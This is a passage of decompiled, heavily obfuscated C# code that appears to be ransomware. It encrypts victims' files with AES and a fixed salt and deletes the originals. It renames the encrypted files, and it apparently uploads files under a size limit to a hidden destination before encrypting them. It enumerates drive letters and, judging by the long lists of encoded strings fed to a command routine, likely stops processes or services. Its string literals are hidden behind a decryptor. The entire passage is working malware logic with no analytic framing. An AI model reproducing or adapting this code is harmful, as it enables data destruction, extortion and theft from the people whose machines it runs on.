			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (JpHrjpLDqbGD == getString_0(107396890))
					{
						foreach (string item in puDhoHwRWOSf)
						{
							if (string_0.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107396890))
							{
								if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107397050))
							{
								try
								{
									boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107385368)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107385368), getString_0(107388093)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void GALUkaYuFKpmDWrv(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (JpHrjpLDqbGD == getString_0(107396890))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in puDhoHwRWOSf)
				{
					if (string_0.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107396890))
					{
						if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107397050))
					{
						try
						{
							boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = qYGhbgYMkFdbXtd.ytKbEkOaFFyA(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		LFhiMkBTtnH++;
	}

	private static void TXBthYggsjbbRKZ(string string_0, string string_1, byte[] byte_0)
	{
		mAAYCaBOREpjOi CS_0024_003C_003E8__locals0 = new mAAYCaBOREpjOi();
		CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI = string_0;
		CS_0024_003C_003E8__locals0.JHqWoxkmnBOB = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string jHqWoxkmnBOB = CS_0024_003C_003E8__locals0.JHqWoxkmnBOB;
			FileStream fileStream = new FileStream(jHqWoxkmnBOB, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (kVikcklGsTH == getString_0(107396890))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.JHqWoxkmnBOB.Length > 0)
				{
					if (JpHrjpLDqbGD == getString_0(107396890))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in puDhoHwRWOSf)
						{
							if (CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107396890))
							{
								if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI.ToLower().EndsWith(item) && vxbhvYdpuaSKJ == getString_0(107397050))
							{
								try
								{
									boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.JHqWoxkmnBOB.EndsWith(getString_0(107385368)))
					{
						File.Move(CS_0024_003C_003E8__locals0.JHqWoxkmnBOB, CS_0024_003C_003E8__locals0.JHqWoxkmnBOB.Replace(getString_0(107385368), getString_0(107388093)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.JHqWoxkmnBOB))
							{
								File.Delete(CS_0024_003C_003E8__locals0.JHqWoxkmnBOB);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385154) + CS_0024_003C_003E8__locals0.ZKyAIFYzlzOiI + getString_0(107385391) + ex2.Message + getString_0(107396323));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__8()
	{
		List<string> kNUHZPWghElTy = KNUHZPWghElTy;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385306)), string_0);
			};
		}
		Parallel.ForEach(kNUHZPWghElTy, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		List<string> source = oXycCNmlNQf;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		if (MxJbfRBhftsQtF == getString_0(107396890))
		{
			string[] kQisENgjpTpjV = KQisENgjpTpjV;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
				{
					FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), getString_0(107385268) + string_0 + getString_0(107385291));
				};
			}
			Parallel.ForEach(kQisENgjpTpjV, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		}
		if (!UwOvJGQsgCiUd().Contains(getString_0(107384988)))
		{
			jGMErVfqJFx(qYTUzbeVAfOi);
		}
		else
		{
			List<string> roJahsXJTpPr = RoJahsXJTpPr;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					FsdXZodtOOOc(UPTUMFgiFSZjXAR(rKFkgeHGiEjCWNc(getString_0(107385286))), string_0);
				};
			}
			Parallel.ForEach(roJahsXJTpPr, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		List<string> vthTCnZGROUQ = VthTCnZGROUQ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385261)), string_0);
			};
		}
		Parallel.ForEach(vthTCnZGROUQ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385306)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), string_0);
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385325)), getString_0(107385268) + string_0 + getString_0(107385291));
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		FsdXZodtOOOc(UPTUMFgiFSZjXAR(rKFkgeHGiEjCWNc(getString_0(107385286))), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385261)), string_0);
	}

	private static void _003CMapDrv_003Eb__1c(string string_0)
	{
		aPWTvfAiNUSg CS_0024_003C_003E8__locals0 = new aPWTvfAiNUSg();
		CS_0024_003C_003E8__locals0.NERHkBpUxLVvh = string_0;
		if ((!CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385212)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385207)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385230)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107388093))) || !zCfylsHdiOAalsC.vumdNHowDgN(CS_0024_003C_003E8__locals0.NERHkBpUxLVvh))
		{
			return;
		}
		try
		{
			Thread.Sleep(UkCNBuKDQgtRHv);
			khKeiHllADXOQ.Add(getString_0(107387122) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + getString_0(107385217));
			try
			{
				if (vktNUmAHjywZJ)
				{
					Console.WriteLine(getString_0(107387122) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + getString_0(107385217));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(UkCNBuKDQgtRHv);
				khKeiHllADXOQ.Add(aPWTvfAiNUSg.getString_0(107387129) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + aPWTvfAiNUSg.getString_0(107397234) + (char)int_0 + aPWTvfAiNUSg.getString_0(107402706));
				try
				{
					if (vktNUmAHjywZJ)
					{
						Console.WriteLine(aPWTvfAiNUSg.getString_0(107387129) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + aPWTvfAiNUSg.getString_0(107397234) + (char)int_0 + aPWTvfAiNUSg.getString_0(107402706));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static efoRmwagKuQD()
	{
		Strings.CreateGetStringDelegate(typeof(efoRmwagKuQD));
		sqPyzQcfkCVQCPN = getString_0(107388504);
		MCumIvWMHDkz = null;
		SltairljJchnm = getString_0(107397050);
		gEOuoXeVYHB = getString_0(107384664);
		khKeiHllADXOQ = new List<string>();
		LPwnHHwGKiFZ = new List<string>();
		aAFtQIiSlwVw = getString_0(107397050);
		JzpKofJbJVhmO = getString_0(107388093);
		LWCdHITXViEa = getString_0(107388093);
		yZUiCzkorMpkDNL = getString_0(107397050);
		MhYLGEHjtBVV = 0;
		IzNCAdEsbOIXNEP = getString_0(107397050);
		nwXuXVuEvfqz = getString_0(107397050);
		RtrrUDTDcMvjk = getString_0(107397050);
		vFCLWAIFjwzum = getString_0(107384683);
		PUFHbRYwhBLf = getString_0(107397050);
		hJFAmQxZaIMujZe = getString_0(107397050);
		WeADOjEhFQzdZ = getString_0(107397050);
		YjnofmLYXjL = getString_0(107397050);
		yWIxTWGPoW = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107384678)),
			UPTUMFgiFSZjXAR(getString_0(107384629)),
			UPTUMFgiFSZjXAR(getString_0(107384604)),
			UPTUMFgiFSZjXAR(getString_0(107384619)),
			UPTUMFgiFSZjXAR(getString_0(107384562)),
			UPTUMFgiFSZjXAR(getString_0(107384537)),
			UPTUMFgiFSZjXAR(getString_0(107384552)),
			UPTUMFgiFSZjXAR(getString_0(107384527)),
			UPTUMFgiFSZjXAR(getString_0(107384470)),
			UPTUMFgiFSZjXAR(getString_0(107384445)),
			UPTUMFgiFSZjXAR(getString_0(107384460)),
			UPTUMFgiFSZjXAR(getString_0(107384915)),
			UPTUMFgiFSZjXAR(getString_0(107384890))
		};
		fOFkEYMAweVTkU = new List<string>();
		ijzRDgneEiZ = getString_0(107397050);
		nIhKqylYltUKZcw = getString_0(107396890);
		NgJQWBCIIpKK = getString_0(107397050);
		jbCXXzvZZcmr = new List<string>();
		GLxpiEQLFfYoBs = getString_0(107397050);
		auZaLVrgHBYXM = getString_0(107384897);
		ASNxyKnqWeCq = getString_0(107396890);
		gqmsRQenlXFCK = getString_0(107397050);
		BOWLZnuqiGkLA = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107384848)),
			UPTUMFgiFSZjXAR(getString_0(107384815)),
			UPTUMFgiFSZjXAR(getString_0(107384782)),
			UPTUMFgiFSZjXAR(getString_0(107384749)),
			UPTUMFgiFSZjXAR(getString_0(107384716)),
			UPTUMFgiFSZjXAR(getString_0(107384175)),
			UPTUMFgiFSZjXAR(getString_0(107384086)),
			UPTUMFgiFSZjXAR(getString_0(107384057)),
			UPTUMFgiFSZjXAR(getString_0(107384044)),
			UPTUMFgiFSZjXAR(getString_0(107383979)),
			UPTUMFgiFSZjXAR(getString_0(107383946)),
			UPTUMFgiFSZjXAR(getString_0(107384425)),
			UPTUMFgiFSZjXAR(getString_0(107384392)),
			UPTUMFgiFSZjXAR(getString_0(107384363)),
			UPTUMFgiFSZjXAR(getString_0(107384334)),
			UPTUMFgiFSZjXAR(getString_0(107384293)),
			UPTUMFgiFSZjXAR(getString_0(107384220)),
			UPTUMFgiFSZjXAR(getString_0(107384195)),
			UPTUMFgiFSZjXAR(getString_0(107383602)),
			UPTUMFgiFSZjXAR(getString_0(107383569)),
			UPTUMFgiFSZjXAR(getString_0(107383540)),
			UPTUMFgiFSZjXAR(getString_0(107383531)),
			UPTUMFgiFSZjXAR(getString_0(107383490)),
			UPTUMFgiFSZjXAR(getString_0(107383457)),
			UPTUMFgiFSZjXAR(getString_0(107383920)),
			UPTUMFgiFSZjXAR(getString_0(107383831)),
			UPTUMFgiFSZjXAR(getString_0(107383822)),
			UPTUMFgiFSZjXAR(getString_0(107383761)),
			UPTUMFgiFSZjXAR(getString_0(107383752)),
			UPTUMFgiFSZjXAR(getString_0(107383695)),
			UPTUMFgiFSZjXAR(getString_0(107383118)),
			UPTUMFgiFSZjXAR(getString_0(107383029)),
			UPTUMFgiFSZjXAR(getString_0(107382964)),
			UPTUMFgiFSZjXAR(getString_0(107382947)),
			UPTUMFgiFSZjXAR(getString_0(107383394)),
			UPTUMFgiFSZjXAR(getString_0(107383337)),
			UPTUMFgiFSZjXAR(getString_0(107383304)),
			UPTUMFgiFSZjXAR(getString_0(107383231)),
			UPTUMFgiFSZjXAR(getString_0(107383190)),
			UPTUMFgiFSZjXAR(getString_0(107383177)),
			UPTUMFgiFSZjXAR(getString_0(107382636)),
			UPTUMFgiFSZjXAR(getString_0(107382571)),
			UPTUMFgiFSZjXAR(getString_0(107382530)),
			UPTUMFgiFSZjXAR(getString_0(107382497)),
			UPTUMFgiFSZjXAR(getString_0(107382424)),
			UPTUMFgiFSZjXAR(getString_0(107382407)),
			UPTUMFgiFSZjXAR(getString_0(107382842)),
			UPTUMFgiFSZjXAR(getString_0(107382769)),
			UPTUMFgiFSZjXAR(getString_0(107382756)),
			UPTUMFgiFSZjXAR(getString_0(107382679)),
			UPTUMFgiFSZjXAR(getString_0(107382666)),
			UPTUMFgiFSZjXAR(getString_0(107382113)),
			UPTUMFgiFSZjXAR(getString_0(107382008)),
			UPTUMFgiFSZjXAR(getString_0(107381979)),
			UPTUMFgiFSZjXAR(getString_0(107381938)),
			UPTUMFgiFSZjXAR(getString_0(107381873)),
			UPTUMFgiFSZjXAR(getString_0(107382372)),
			UPTUMFgiFSZjXAR(getString_0(107382343)),
			UPTUMFgiFSZjXAR(getString_0(107382266)),
			UPTUMFgiFSZjXAR(getString_0(107382201)),
			UPTUMFgiFSZjXAR(getString_0(107382172)),
			UPTUMFgiFSZjXAR(getString_0(107382147)),
			UPTUMFgiFSZjXAR(getString_0(107381570)),
			UPTUMFgiFSZjXAR(getString_0(107381497)),
			UPTUMFgiFSZjXAR(getString_0(107381468)),
			UPTUMFgiFSZjXAR(getString_0(107381427)),
			UPTUMFgiFSZjXAR(getString_0(107381378)),
			UPTUMFgiFSZjXAR(getString_0(107381829)),
			UPTUMFgiFSZjXAR(getString_0(107381724)),
			UPTUMFgiFSZjXAR(getString_0(107381711)),
			UPTUMFgiFSZjXAR(getString_0(107381678)),
			UPTUMFgiFSZjXAR(getString_0(107381637)),
			UPTUMFgiFSZjXAR(getString_0(107381016)),
			UPTUMFgiFSZjXAR(getString_0(107381003)),
			UPTUMFgiFSZjXAR(getString_0(107380882)),
			UPTUMFgiFSZjXAR(getString_0(107380865)),
			UPTUMFgiFSZjXAR(getString_0(107381348)),
			UPTUMFgiFSZjXAR(getString_0(107381275)),
			UPTUMFgiFSZjXAR(getString_0(107381210)),
			UPTUMFgiFSZjXAR(getString_0(107381193)),
			UPTUMFgiFSZjXAR(getString_0(107381136)),
			UPTUMFgiFSZjXAR(getString_0(107413359)),
			UPTUMFgiFSZjXAR(getString_0(107413266)),
			UPTUMFgiFSZjXAR(getString_0(107413209)),
			UPTUMFgiFSZjXAR(getString_0(107383337)),
			UPTUMFgiFSZjXAR(getString_0(107413152)),
			UPTUMFgiFSZjXAR(getString_0(107413111)),
			UPTUMFgiFSZjXAR(getString_0(107413534)),
			UPTUMFgiFSZjXAR(getString_0(107413489)),
			UPTUMFgiFSZjXAR(getString_0(107413428)),
			UPTUMFgiFSZjXAR(getString_0(107413403)),
			UPTUMFgiFSZjXAR(getString_0(107413390)),
			UPTUMFgiFSZjXAR(getString_0(107412797)),
			UPTUMFgiFSZjXAR(getString_0(107383695)),
			UPTUMFgiFSZjXAR(getString_0(107412732)),
			UPTUMFgiFSZjXAR(getString_0(107412691)),
			UPTUMFgiFSZjXAR(getString_0(107412634)),
			UPTUMFgiFSZjXAR(getString_0(107383118)),
			UPTUMFgiFSZjXAR(getString_0(107413073)),
			UPTUMFgiFSZjXAR(getString_0(107413024)),
			UPTUMFgiFSZjXAR(getString_0(107412967)),
			UPTUMFgiFSZjXAR(getString_0(107412902)),
			UPTUMFgiFSZjXAR(getString_0(107412309)),
			UPTUMFgiFSZjXAR(getString_0(107382964)),
			UPTUMFgiFSZjXAR(getString_0(107412264)),
			UPTUMFgiFSZjXAR(getString_0(107383304)),
			UPTUMFgiFSZjXAR(getString_0(107382947)),
			UPTUMFgiFSZjXAR(getString_0(107412231)),
			UPTUMFgiFSZjXAR(getString_0(107412174)),
			UPTUMFgiFSZjXAR(getString_0(107383394)),
			UPTUMFgiFSZjXAR(getString_0(107412141)),
			UPTUMFgiFSZjXAR(getString_0(107412572)),
			UPTUMFgiFSZjXAR(getString_0(107412555)),
			UPTUMFgiFSZjXAR(getString_0(107383752)),
			UPTUMFgiFSZjXAR(getString_0(107412498)),
			UPTUMFgiFSZjXAR(getString_0(107412485)),
			UPTUMFgiFSZjXAR(getString_0(107412456)),
			UPTUMFgiFSZjXAR(getString_0(107412427)),
			UPTUMFgiFSZjXAR(getString_0(107412350)),
			UPTUMFgiFSZjXAR(getString_0(107411805)),
			UPTUMFgiFSZjXAR(getString_0(107411812)),
			UPTUMFgiFSZjXAR(getString_0(107411735)),
			UPTUMFgiFSZjXAR(getString_0(107411710)),
			UPTUMFgiFSZjXAR(getString_0(107411669)),
			UPTUMFgiFSZjXAR(getString_0(107411656)),
			UPTUMFgiFSZjXAR(getString_0(107411575)),
			UPTUMFgiFSZjXAR(getString_0(107412030)),
			UPTUMFgiFSZjXAR(getString_0(107411997)),
			UPTUMFgiFSZjXAR(getString_0(107411984)),
			UPTUMFgiFSZjXAR(getString_0(107411951)),
			UPTUMFgiFSZjXAR(getString_0(107411910)),
			UPTUMFgiFSZjXAR(getString_0(107383761)),
			UPTUMFgiFSZjXAR(getString_0(107411575)),
			UPTUMFgiFSZjXAR(getString_0(107411837)),
			UPTUMFgiFSZjXAR(getString_0(107411296)),
			UPTUMFgiFSZjXAR(getString_0(107411299)),
			UPTUMFgiFSZjXAR(getString_0(107411218)),
			UPTUMFgiFSZjXAR(getString_0(107411209)),
			UPTUMFgiFSZjXAR(getString_0(107411148)),
			UPTUMFgiFSZjXAR(getString_0(107411075)),
			UPTUMFgiFSZjXAR(getString_0(107411558)),
			UPTUMFgiFSZjXAR(getString_0(107411525)),
			UPTUMFgiFSZjXAR(getString_0(107411420)),
			UPTUMFgiFSZjXAR(getString_0(107411391)),
			UPTUMFgiFSZjXAR(getString_0(107411346)),
			UPTUMFgiFSZjXAR(getString_0(107410769)),
			UPTUMFgiFSZjXAR(getString_0(107410768)),
			UPTUMFgiFSZjXAR(getString_0(107410723)),
			UPTUMFgiFSZjXAR(getString_0(107410662)),
			UPTUMFgiFSZjXAR(getString_0(107410629)),
			UPTUMFgiFSZjXAR(getString_0(107410552)),
			UPTUMFgiFSZjXAR(getString_0(107410999)),
			UPTUMFgiFSZjXAR(getString_0(107410966)),
			UPTUMFgiFSZjXAR(getString_0(107410957)),
			UPTUMFgiFSZjXAR(getString_0(107410876)),
			UPTUMFgiFSZjXAR(getString_0(107383920)),
			UPTUMFgiFSZjXAR(getString_0(107410847)),
			UPTUMFgiFSZjXAR(getString_0(107410822)),
			UPTUMFgiFSZjXAR(getString_0(107410237)),
			UPTUMFgiFSZjXAR(getString_0(107410224)),
			UPTUMFgiFSZjXAR(getString_0(107410183)),
			UPTUMFgiFSZjXAR(getString_0(107410106)),
			UPTUMFgiFSZjXAR(getString_0(107410045)),
			UPTUMFgiFSZjXAR(getString_0(107410540)),
			UPTUMFgiFSZjXAR(getString_0(107410459)),
			UPTUMFgiFSZjXAR(getString_0(107410434)),
			UPTUMFgiFSZjXAR(getString_0(107410377)),
			UPTUMFgiFSZjXAR(getString_0(107410300)),
			UPTUMFgiFSZjXAR(getString_0(107409747)),
			UPTUMFgiFSZjXAR(getString_0(107409690)),
			UPTUMFgiFSZjXAR(getString_0(107383831)),
			UPTUMFgiFSZjXAR(getString_0(107409617)),
			UPTUMFgiFSZjXAR(getString_0(107409588)),
			UPTUMFgiFSZjXAR(getString_0(107409555)),
			UPTUMFgiFSZjXAR(getString_0(107409546)),
			UPTUMFgiFSZjXAR(getString_0(107410029)),
			UPTUMFgiFSZjXAR(getString_0(107383457)),
			UPTUMFgiFSZjXAR(getString_0(107409988)),
			UPTUMFgiFSZjXAR(getString_0(107409907)),
			UPTUMFgiFSZjXAR(getString_0(107409878)),
			UPTUMFgiFSZjXAR(getString_0(107382172)),
			UPTUMFgiFSZjXAR(getString_0(107409845)),
			UPTUMFgiFSZjXAR(getString_0(107409878)),
			UPTUMFgiFSZjXAR(getString_0(107409816)),
			UPTUMFgiFSZjXAR(getString_0(107409787)),
			UPTUMFgiFSZjXAR(getString_0(107409246)),
			UPTUMFgiFSZjXAR(getString_0(107409229)),
			UPTUMFgiFSZjXAR(getString_0(107409148)),
			UPTUMFgiFSZjXAR(getString_0(107409107)),
			UPTUMFgiFSZjXAR(getString_0(107409046)),
			UPTUMFgiFSZjXAR(getString_0(107409017)),
			UPTUMFgiFSZjXAR(getString_0(107409520)),
			UPTUMFgiFSZjXAR(getString_0(107409475)),
			UPTUMFgiFSZjXAR(getString_0(107409398)),
			UPTUMFgiFSZjXAR(getString_0(107409365)),
			UPTUMFgiFSZjXAR(getString_0(107409308)),
			UPTUMFgiFSZjXAR(getString_0(107409295)),
			UPTUMFgiFSZjXAR(getString_0(107408694)),
			UPTUMFgiFSZjXAR(getString_0(107408661)),
			UPTUMFgiFSZjXAR(getString_0(107408652)),
			UPTUMFgiFSZjXAR(getString_0(107408623)),
			UPTUMFgiFSZjXAR(getString_0(107408530)),
			UPTUMFgiFSZjXAR(getString_0(107408497)),
			UPTUMFgiFSZjXAR(getString_0(107408952)),
			UPTUMFgiFSZjXAR(getString_0(107408943)),
			UPTUMFgiFSZjXAR(getString_0(107408862)),
			UPTUMFgiFSZjXAR(getString_0(107408829)),
			UPTUMFgiFSZjXAR(getString_0(107408812)),
			UPTUMFgiFSZjXAR(getString_0(107408223)),
			UPTUMFgiFSZjXAR(getString_0(107408206)),
			UPTUMFgiFSZjXAR(getString_0(107408161)),
			UPTUMFgiFSZjXAR(getString_0(107408112)),
			UPTUMFgiFSZjXAR(getString_0(107408079)),
			UPTUMFgiFSZjXAR(getString_0(107408038)),
			UPTUMFgiFSZjXAR(getString_0(107408477)),
			UPTUMFgiFSZjXAR(getString_0(107408464)),
			UPTUMFgiFSZjXAR(getString_0(107411209)),
			UPTUMFgiFSZjXAR(getString_0(107408431)),
			UPTUMFgiFSZjXAR(getString_0(107408390)),
			UPTUMFgiFSZjXAR(getString_0(107408333)),
			UPTUMFgiFSZjXAR(getString_0(107408304)),
			UPTUMFgiFSZjXAR(getString_0(107408271)),
			UPTUMFgiFSZjXAR(getString_0(107407726)),
			UPTUMFgiFSZjXAR(getString_0(107407645)),
			UPTUMFgiFSZjXAR(getString_0(107407616)),
			UPTUMFgiFSZjXAR(getString_0(107407571)),
			UPTUMFgiFSZjXAR(getString_0(107407558)),
			UPTUMFgiFSZjXAR(getString_0(107407485)),
			UPTUMFgiFSZjXAR(getString_0(107407972)),
			UPTUMFgiFSZjXAR(getString_0(107407891)),
			UPTUMFgiFSZjXAR(getString_0(107407862)),
			UPTUMFgiFSZjXAR(getString_0(107407849))
		};
		KNUHZPWghElTy = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107407776)),
			UPTUMFgiFSZjXAR(getString_0(107407759)),
			UPTUMFgiFSZjXAR(getString_0(107407166)),
			UPTUMFgiFSZjXAR(getString_0(107407149)),
			UPTUMFgiFSZjXAR(getString_0(107407068)),
			UPTUMFgiFSZjXAR(getString_0(107407003)),
			UPTUMFgiFSZjXAR(getString_0(107407470)),
			UPTUMFgiFSZjXAR(getString_0(107407377))
		};
		oXycCNmlNQf = new List<string>
		{
			UPTUMFgiFSZjXAR(getString_0(107407320)),
			UPTUMFgiFSZjXAR(getString_0(107407287)),
			UPTUMFgiFSZjXAR(getString_0(107407274)),
			UPTUMFgiFSZjXAR(getString_0(107406681)),
			UPTUMFgiFSZjXAR(getString_0(107406648)),
			UPTUMFgiFSZjXAR(getString_0(107406631)),
			UPTUMFgiFSZjXAR(getString_0(107406554)),
			UPTUMFgiFSZjXAR(getString_0(107406521)),
			UPTUMFgiFSZjXAR(getString_0(107406488)),
			UPTUMFgiFSZjXAR(getString_0(107406455)),
			UPTUMFgiFSZjXAR(getString_0(107406934)),
			UPTUMFgiFSZjXAR(getString_0(107406901)),
			UPTUMFgiFSZjXAR(getString_0(107406892)),
			UPTUMFgiFSZjXAR(getString_0(107406851)),
			UPTUMFgiFSZjXAR(getString_0(107406774)),
			UPTUMFgiFSZjXAR(getString_0(107406741)),
			UPTUMFgiFSZjXAR(getString_0(107406732)),
			UPTUMFgiFSZjXAR(getString_0(107406187)),
